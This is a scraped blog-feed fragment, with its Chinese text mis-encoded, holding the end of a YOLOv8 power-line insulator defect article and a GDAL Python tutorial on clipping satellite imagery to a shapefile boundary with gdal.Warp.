<li>ç”µç½‘ç¼ºé™·å¿«é€Ÿç­›æŸ¥ä¸ç»Ÿè®¡</li>
<li>æ™ºèƒ½è¿ç»´ç¤ºèŒƒé¡¹ç›®</li>
</ul>
<h4 data-id="heading-16">8.2 å¯æ‰©å±•æ–¹å‘</h4>
<ul>
<li>ç¼ºé™·ä¸¥é‡ç¨‹åº¦è‡ªåŠ¨åˆ†çº§</li>
<li>ä¸å·¡æ£€å·¥å•ç³»ç»Ÿå¯¹æ¥</li>
<li>ç¼ºé™·æ—¶åºå˜åŒ–åˆ†æ</li>
<li>å¤šæ¨¡å‹ååŒæ£€æµ‹ï¼ˆå¦‚åˆ†å‰² + æ£€æµ‹ï¼‰</li>
</ul>
<hr/>
<h3 data-id="heading-17">ä¹ã€æ€»ç»“ä¸æ€è€ƒ</h3>
<p>æœ¬æ–‡å›´ç»•ç”µç½‘ç»ç¼˜å­ç ´æŸä¸é—ªç»œç¼ºé™·æ£€æµ‹è¿™ä¸€å…¸å‹å·¥ä¸šè§†è§‰é—®é¢˜ï¼Œç³»ç»Ÿæ€§åœ°ä»‹ç»äº†ä¸€å¥— <strong>åŸºäº YOLOv8 çš„æ™ºèƒ½æ£€æµ‹ç³»ç»Ÿ</strong> çš„å®Œæ•´å®ç°è¿‡ç¨‹ã€‚ä»é—®é¢˜èƒŒæ™¯ã€ç³»ç»Ÿæ¶æ„ã€æ¨¡å‹è®­ç»ƒï¼Œåˆ°å¯è§†åŒ–åº”ç”¨ä¸å·¥ç¨‹éƒ¨ç½²ï¼Œå±•ç¤ºäº†æ·±åº¦å­¦ä¹ æŠ€æœ¯åœ¨ç”µåŠ›è¿ç»´åœºæ™¯ä¸­çš„å®é™…ä»·å€¼ã€‚</p>
<p>å®è·µè¡¨æ˜ï¼Œ<strong>åªæœ‰å°†ç®—æ³•èƒ½åŠ›ä¸å·¥ç¨‹éœ€æ±‚æ·±åº¦ç»“åˆï¼ŒAI æŠ€æœ¯æ‰èƒ½çœŸæ­£è½åœ°å¹¶äº§ç”Ÿé•¿æœŸä»·å€¼</strong>ã€‚æœ¬é¡¹ç›®ä¸ä»…é€‚åˆä½œä¸ºç”µåŠ›å·¡æ£€æ™ºèƒ½åŒ–çš„å‚è€ƒæ–¹æ¡ˆï¼Œä¹Ÿä¸ºå…¶ä»–å·¥ä¸šç¼ºé™·æ£€æµ‹åœºæ™¯æä¾›äº†å¯å¤ç”¨çš„æŠ€æœ¯èŒƒå¼ã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[GDAL å®ç°å½±åƒè£å‰ª]]></title>    <link>https://juejin.cn/post/7597623395907977262</link>    <guid>https://juejin.cn/post/7597623395907977262</guid>    <pubDate>2026-01-21T13:08:11.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7597623395907977262" data-draft-id="7597640029574447155" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="GDAL å®ç°å½±åƒè£å‰ª"/> <meta itemprop="keywords" content="å‰ç«¯"/> <meta itemprop="datePublished" content="2026-01-21T13:08:11.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="GISä¹‹è·¯"/> <meta itemprop="url" content="https://juejin.cn/user/4346787284915481"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            GDAL å®ç°å½±åƒè£å‰ª
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4346787284915481/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    GISä¹‹è·¯
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-21T13:08:11.000Z" title="Wed Jan 21 2026 13:08:11 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-21
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»4åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">^Â å…³æ³¨æˆ‘ï¼Œå¸¦ä½ ä¸€èµ·å­¦GISÂ ^</h2>
<h2 data-id="heading-1">å‰è¨€</h2>
<blockquote>
<p>â</p>
<p>GDALä½œä¸ºåœ°ç†ç©ºé—´æ•°æ®å¤„ç†çš„æ ¸å¿ƒå·¥å…·ï¼Œæä¾›äº†å¤šç§å½±åƒè£å‰ªæ–¹å¼ï¼Œå¯ä»¥æ–¹ä¾¿çš„æå–ç›®æ ‡åŒºåŸŸé¥æ„Ÿå½±åƒæ•°æ®ï¼Œä¸ºæ•°æ®å¤„ç†å’Œåˆ†ææä¾›é«˜æ•ˆæœåŠ¡ã€‚</p>
<p>åœ¨åœ°ç†ç©ºé—´æ•°æ®å¤„ç†ä¸­ï¼Œå½±åƒè£å‰ªæ˜¯åŸºç¡€ä¸”é«˜é¢‘çš„æ“ä½œï¼Œå…¶æ ¸å¿ƒç›®æ ‡æ˜¯ä»æ•´å¹…é¥æ„Ÿå½±åƒæˆ–æ …æ ¼æ•°æ®ä¸­æå–æŒ‡å®šåœ°ç†èŒƒå›´çš„å­é›†ï¼Œä»¥é™ä½æ•°æ®ä½“é‡ã€èšç„¦ç ”ç©¶åŒºåŸŸï¼Œæ»¡è¶³ä¸“é¢˜åˆ†æã€åœ°å›¾åˆ¶ä½œã€æ•°æ®å…±äº«ç­‰å¤šæ ·åŒ–ä¸šåŠ¡éœ€æ±‚ã€‚</p>
</blockquote>
<p>ç”±äºæœ¬æ–‡ç”±ä¸€äº›å‰ç½®çŸ¥è¯†ï¼Œåœ¨æ­£å¼å¼€å§‹ä¹‹å‰ï¼Œéœ€è¦ä½ æŒæ¡ä¸€å®šçš„<code>Python</code>å¼€å‘åŸºç¡€å’Œ<code>GDAL</code>çš„åŸºæœ¬æ¦‚å¿µã€‚åœ¨ä¹‹å‰çš„æ–‡ç« ä¸­è®²è§£äº†å¦‚ä½•ä½¿ç”¨<code>GDAL</code>æˆ–è€…<code>ogr2ogr</code>å·¥å…·å°†<code>txt</code>ä»¥åŠ<code>csv</code>æ–‡æœ¬æ•°æ®è½¬æ¢ä¸º<code>Shp</code>æ ¼å¼ï¼Œå¯ä»¥ä½œä¸ºåŸºç¡€å…¥é—¨å­¦ä¹ ã€‚</p>
<p>æœ¬ç¯‡æ•™ç¨‹åœ¨ä¹‹å‰ä¸€ç³»åˆ—æ–‡ç« çš„åŸºç¡€ä¸Šè®²è§£å¦‚ä½•ä½¿ç”¨<strong>GDAL å®ç°å½±åƒè£å‰ª</strong>ã€‚</p>
<ul>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%2FQtb_BJw91nKrFMeoa7WcxA" target="_blank" title="https://mp.weixin.qq.com/s/Qtb_BJw91nKrFMeoa7WcxA" ref="nofollow noopener noreferrer">GDAL ç®€ä»‹</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%2FFLWfZItLj24JYicQEX-PbQ" target="_blank" title="https://mp.weixin.qq.com/s/FLWfZItLj24JYicQEX-PbQ" ref="nofollow noopener noreferrer">GDAL ä¸‹è½½å®‰è£…</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%2Fu0539e3CM2q4Y3MbMxxZKQ" target="_blank" title="https://mp.weixin.qq.com/s/u0539e3CM2q4Y3MbMxxZKQ" ref="nofollow noopener noreferrer">GDAL å¼€å‘èµ·æ­¥</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%2F0DGoC0oFHizJbweBnEvI-g" target="_blank" title="https://mp.weixin.qq.com/s/0DGoC0oFHizJbweBnEvI-g" ref="nofollow noopener noreferrer">GDAL å®ç° GIS æ•°æ®è¯»å–è½¬æ¢ï¼ˆå…¨ï¼‰</a></li>
</ul>
<p>å¦‚æœä½ è¿˜æ²¡æœ‰çœ‹è¿‡ï¼Œå»ºè®®ä»ä»¥ä¸Šå†…å®¹å¼€å§‹ã€‚</p>
<h2 data-id="heading-2">1. å¼€å‘ç¯å¢ƒ</h2>
<p>æœ¬æ–‡ä½¿ç”¨å¦‚ä¸‹å¼€å‘ç¯å¢ƒï¼Œä»¥ä¾›å‚è€ƒã€‚</p>
<p>æ—¶é—´ï¼š<code>2026å¹´</code></p>
<p>ç³»ç»Ÿï¼š<code>Windows 11</code></p>
<p>Pythonï¼š<code>3.11.11</code></p>
<p>GDALï¼š<code>3.11.1</code></p>
<h2 data-id="heading-3">2. æ•°æ®å‡†å¤‡</h2>
<p>ä¿—è¯è¯´å·§å¦‡éš¾ä¸ºæ— ç±³ä¹‹ç‚Šï¼Œæ•°æ®å°±æ˜¯è½¯ä»¶çš„åŸºçŸ³ï¼Œæ²¡æœ‰æ•°æ®ï¼Œå†ç¾å¥½çš„è®¾æƒ³éƒ½æ˜¯ç©ºä¸­æ¥¼é˜ã€‚å› æ­¤ï¼Œç¬¬ä¸€æ­¥éœ€è¦ä¸‹è½½é¥æ„Ÿå½±åƒæ•°æ®ã€‚</p>
<p>ä½†æ˜¯ï¼Œå½±åƒæ•°æ®åœ¨å“ªé‡Œä¸‹è½½å‘¢ï¼Ÿåˆ«ç€æ€¥ï¼Œæœ¬æ–‡éƒ½ç»™ä½ æ•´ç†å¥½äº†ã€‚</p>
<p>æ•°æ®ä¸‹è½½å¯å‚è€ƒæ–‡ç« ï¼š<strong><a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%2F5c_J7f0xkUXEv7_z0eNweQ" target="_blank" title="https://mp.weixin.qq.com/s/5c_J7f0xkUXEv7_z0eNweQ" ref="nofollow noopener noreferrer">GIS å½±åƒæ•°æ®æºä»‹ç»</a></strong></p>
<p>å¦‚ä¸‹ï¼Œè¿™æ˜¯æˆ‘åœ¨ã€åœ°ç†ç©ºé—´æ•°æ®äº‘ã€‘å¹³å°ä¸‹è½½çš„<code>landsat8</code>é¥æ„Ÿå½±åƒã€‚<img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/3c17257dedf942bba7a98241a801678a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgR0lT5LmL6Lev:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769605691&amp;x-signature=YyY9sihTHirNbWous6iigX0Tys4%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-4">3. å¯¼å…¥ä¾èµ–</h2>
<p><code>GeoTIFF</code>ä½œä¸ºä¸€ç§æ …æ ¼æ•°æ®æ ¼å¼ï¼Œå¯ä»¥ä½¿ç”¨<code>GDAL</code>ç›´æ¥è¿›è¡Œå¤„ç†ï¼Œä»¥å®ç°å½±åƒæ•°æ®çš„è£å‰ªæ“ä½œã€‚</p>
<p>åœ¨å½±åƒè£å‰ªå¼€å§‹ä¹‹å‰ï¼Œéœ€è¦æ£€æŸ¥æ•°æ®è·¯å¾„æ˜¯å¦æ­£ç¡®ï¼Œæ‰€ä»¥å¯¼å…¥<code>os</code>æ¨¡å—ã€‚</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">from</span> osgeo <span class="hljs-keyword">import</span> gdal
<span class="hljs-keyword">import</span> os
</code></pre>
<h2 data-id="heading-5">4. å½±åƒè£å‰ª</h2>
<p>å®šä¹‰ä¸€ä¸ªæ–¹æ³•<code>image_clip(output_file,input_file,clip_file)</code>ç”¨äºå®ç°å½±åƒæ•°æ®è£å‰ªã€‚</p>
<p>æœ¬ç ”ç©¶é‡‡ç”¨çŸ¢é‡èŒƒå›´æå–å½±åƒåŒºåŸŸï¼Œå®ç°æ …æ ¼æ•°æ®æŒ‰æ©è†œè£å‰ªåŠŸèƒ½ã€‚</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-string">"""
è¯´æ˜ï¼šGDAL å½±åƒè£å‰ª
å‚æ•°ï¼š
Â  Â  -output_fileï¼šè¾“å‡ºè£å‰ªåçš„å½±åƒ
Â  Â  -input_filesï¼šè¾“å…¥éœ€è¦è£å‰ªçš„çš„å½±åƒ
Â  Â  -clip_fileï¼šç”¨äºå½±åƒè£å‰ªçš„çŸ¢é‡æ–‡ä»¶
"""</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">image_clip</span>(<span class="hljs-params">output_file,input_file,clip_file</span>):
</code></pre>
<p>åœ¨æ•°æ®è£å‰ªä¹‹å‰ï¼Œä½¿ç”¨æ–¹æ³•<code>checkFilePath</code>æ£€æŸ¥æ•°æ®è·¯å¾„ã€‚</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># æ£€æŸ¥æ–‡ä»¶æ˜¯å¦å­˜åœ¨</span>
checkFilePath(input_file)
<span class="hljs-string">"""
è¯´æ˜ï¼šæ£€æŸ¥æ–‡ä»¶è·¯å¾„æ˜¯å¦æ­£å¸¸
å‚æ•°ï¼š
-filePathï¼šæ–‡ä»¶æ•°æ®è·¯å¾„
"""</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">checkFilePath</span>(<span class="hljs-params">filePath</span>):
Â  Â Â <span class="hljs-keyword">if</span>Â os.path.exists(filePath):
Â  Â  Â  Â Â <span class="hljs-built_in">print</span>(<span class="hljs-string">f"<span class="hljs-subst">{filePath}</span> æ–‡ä»¶æ•°æ®è·¯å¾„å­˜åœ¨"</span>)
Â  Â Â <span class="hljs-keyword">else</span>:
Â  Â  Â  Â Â <span class="hljs-built_in">print</span>(<span class="hljs-string">f"<span class="hljs-subst">{filePath}</span> æ–‡ä»¶æ•°æ®è·¯å¾„ä¸å­˜åœ¨ï¼Œè¯·æ£€æŸ¥ï¼"</span>)
</code></pre>
<p>ä½¿ç”¨<code>gdal.WarpOptions</code>é€‰é¡¹å®šä¹‰è£å‰ªå‚æ•°ï¼Œå…¶ä¸­å‚æ•°<code>cutlineDSName</code>ä¸ºç”¨äºæå–èŒƒå›´çš„çŸ¢é‡æ•°æ®æºï¼Œ<code>cropToCutline</code>ä¸ºå¸ƒå°”ç±»å‹ï¼Œè¡¨ç¤ºæ˜¯å¦ä½¿ç”¨è£å‰ªçº¿ä½œä¸ºè¾“å‡ºè¾¹ç•Œï¼Œ<code>dstNodata</code>ä¸ºè®¾ç½®<code>NoData</code>å€¼ã€‚</p>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-comment"># å®šä¹‰è£å‰ªå‚æ•°</span>
<span class="hljs-attr">options</span> = gdal.WarpOptions(
Â  Â  <span class="hljs-attr">cutlineDSName</span>=clip_file,
Â  Â  <span class="hljs-attr">cropToCutline</span>=<span class="hljs-literal">True</span>,
Â  Â  <span class="hljs-attr">dstNodata</span>=<span class="hljs-number">0</span>
)
</code></pre>
<p>è¿™ä¸ªæ–¹æ³•å‚æ•°éå¸¸å¤šï¼Œæ„Ÿå…´è¶£çš„åŒå­¦å¯ä»¥åˆ°å®˜ç½‘æŸ¥çœ‹ã€‚</p>
<p><code>https://gdal.org/en/stable/api/python/utilities.html#osgeo.gdal.WarpOptions</code><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ec03aa001a55418882802b12307497d7~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgR0lT5LmL6Lev:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769605691&amp;x-signature=ohqL%2FmQ5DahmuZUiP5TxNalrVg0%3D" alt="" loading="lazy"/></p>
<p>è°ƒç”¨<code>gdal</code>å¯¹è±¡æ–¹æ³•<code>Warp</code>è¿›è¡Œå½±åƒè£å‰ªï¼Œè¯¥å‡½æ•°ç¬¬ä¸€ä¸ªå‚æ•°<code>destNameOrDestDS</code>Â ä¸ºè¾“å‡ºæ•°æ®é›†åç§°æˆ–è€…æ•°æ®æºï¼Œç¬¬äºŒä¸ªå‚æ•°<code>srcDSOrSrcDSTab</code>ä¸ºæºæ•°æ®ï¼Œç¬¬ä¸‰ä¸ªå‚æ•°<code>options</code>ä¸ºå¯é€‰é¡¹æè¿°ï¼Œç”¨äºå®šä¹‰å½±åƒè£å‰ªä¿¡æ¯ã€‚<img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f5db04646b244df0a365b071400dffd2~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgR0lT5LmL6Lev:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769605691&amp;x-signature=2oV6tIhmPVES%2B8Lmozx9VFUKLRw%3D" alt="" loading="lazy"/></p>
<pre><code class="hljs language-ini" lang="ini">gdal.Warp(output_file,input_file,<span class="hljs-attr">options</span>=options)
</code></pre>
<p>åœ¨<code>main</code>å‡½æ•°ä¸­è°ƒç”¨åˆå¹¶æ–¹æ³•ã€‚</p>
<pre><code class="hljs language-ini" lang="ini">ifÂ <span class="hljs-attr">__name__</span> ==Â <span class="hljs-string">"__main__"</span>:

Â  Â  <span class="hljs-attr">input_file</span> =Â <span class="hljs-string">"E:\ArcGIS\band_432.tif"</span>

Â  Â  <span class="hljs-attr">output_file</span> =Â <span class="hljs-string">"E:\ArcGIS\clip_result.tif"</span>

Â  Â  <span class="hljs-attr">clip_file</span> =Â <span class="hljs-string">"E:\data\target.shp"</span>

Â  Â  image_clip(output_file,input_file,clip_file)
</code></pre>
<hr/>
<blockquote>
<p>æ³¨ï¼šGDALæŸäº›å‚æ•°æ˜¯çœŸéš¾è®°ï¼Œéš¾å†™å•Šï¼Œæ¯”å¦‚WarpOptionså¯¹è±¡ã€‚</p>
<p>GISä¹‹è·¯</p>
</blockquote>
<p><strong>å›¾ç‰‡æ•ˆæœ</strong></p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/44f6d256887a4e9a8f54d5acc27c970d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgR0lT5LmL6Lev:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769605691&amp;x-signature=8CpZCUZYJLfRKNWjeK%2BGoW6%2BDjY%3D" alt="" loading="lazy"/></p>
<p><strong><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/34df1044df2f44da987f4fcee3bc06cc~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgR0lT5LmL6Lev:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769605691&amp;x-signature=SGRX57CHX6xQq8eubrPHsGnekX4%3D" alt="" loading="lazy"/></strong></p>
<blockquote>
<p>â</p>
<p>OpenLayersç¤ºä¾‹æ•°æ®ä¸‹è½½ï¼Œè¯·åœ¨å…¬ä¼—å·åå°å›å¤ï¼š<strong>vector</strong></p>
<p>å…¨å›½ä¿¡æ¯åŒ–å·¥ç¨‹å¸ˆï¼GIS åº”ç”¨æ°´å¹³è€ƒè¯•èµ„æ–™ï¼Œè¯·åœ¨å…¬ä¼—å·åå°å›å¤ï¼š<strong>GISè€ƒè¯•</strong></p>
</blockquote>
<blockquote>
<p>â</p>
<p><em><strong>GISä¹‹è·¯</strong></em> å…¬ä¼—å·å·²ç»æ¥å…¥äº†<strong>æ™ºèƒ½</strong> <strong>åŠ©æ‰‹</strong>ï¼Œå¯ä»¥åœ¨å¯¹è¯æ¡†è¿›è¡Œæé—®ï¼Œä¹Ÿå¯ä»¥ç›´æ¥æœç´¢å†å²æ–‡ç« è¿›è¡ŒæŸ¥çœ‹ã€‚</p>
</blockquote>
<p>éƒ½çœ‹åˆ°è¿™äº†ï¼Œä¸è¦å¿˜è®°<em><strong>ç‚¹èµã€æ”¶è—</strong></em> <strong>+</strong> <em><strong>å…³æ³¨</strong></em> å“¦ <strong>ï¼</strong></p>
<p>æœ¬å·ä¸å®šæ—¶æ›´æ–°æœ‰å…³Â <em><strong>GISå¼€å‘</strong></em> ç›¸å…³å†…å®¹ï¼Œ<em><strong>æ¬¢è¿å…³æ³¨Â <img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/768151730d5540d4afbb40ae44d14502~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgR0lT5LmL6Lev:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769605691&amp;x-signature=rXn%2BFzXNBauC5ZU83BDVX0E5Yrc%3D" alt="" loading="lazy"/><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/1f56cdbc2e0c4672a6fa0741dff64089~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgR0lT5LmL6Lev:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769605691&amp;x-signature=WGAHRsbGWmdqcwDZPcp%2FmHvKOq8%3D" alt="" loading="lazy"/></strong></em></p>
<hr/>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/4a099f11e6f84d9fa661ddb5675c748e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgR0lT5LmL6Lev:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769605691&amp;x-signature=EopWBgp0Zj0nRiDXeyptATOKmIE%3D" alt="" loading="lazy"/></p>
<p>Â  Â <img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/decae22f59834f3cbc0758d006c39074~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgR0lT5LmL6Lev:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769605691&amp;x-signature=iOA1ssRWtfjkjwoZSPEXuHnUVAY%3D" alt="" loading="lazy"/>Â </p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%3F__biz%3DMzkwOTEzNjI5NQ%3D%3D%26mid%3D2247487953%26idx%3D1%26sn%3D0b2d5aeefdb290583cf8cdd82f3c2077%26scene%3D21%23wechat_redirect" target="_blank" title="https://mp.weixin.qq.com/s?__biz=MzkwOTEzNjI5NQ==&amp;mid=2247487953&amp;idx=1&amp;sn=0b2d5aeefdb290583cf8cdd82f3c2077&amp;scene=21#wechat_redirect" ref="nofollow noopener noreferrer">GeoTools å¼€å‘åˆé›†ï¼ˆå…¨ï¼‰</a></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%3F__biz%3DMzkwOTEzNjI5NQ%3D%3D%26mid%3D2247487119%26idx%3D1%26sn%3Dc313efa84c27bf933ef2f2a47991ef2d%26scene%3D21%23wechat_redirect" target="_blank" title="https://mp.weixin.qq.com/s?__biz=MzkwOTEzNjI5NQ==&amp;mid=2247487119&amp;idx=1&amp;sn=c313efa84c27bf933ef2f2a47991ef2d&amp;scene=21#wechat_redirect" ref="nofollow noopener noreferrer">OpenLayers å¼€å‘åˆé›†</a></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%2FeOTtaQXdeB-hOO39GmBrtw" target="_blank" title="https://mp.weixin.qq.com/s/eOTtaQXdeB-hOO39GmBrtw" ref="nofollow noopener noreferrer">GDAL å®ç°å½±åƒåˆå¹¶</a></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%2FGynyIuYw2eRJ4y6gZ8oSLQ" target="_blank" title="https://mp.weixin.qq.com/s/GynyIuYw2eRJ4y6gZ8oSLQ" ref="nofollow noopener noreferrer">å°å°å£°è¯´ä¸€ä¸‹GDALçš„å®˜æ–¹APIæ¥å£</a></p>
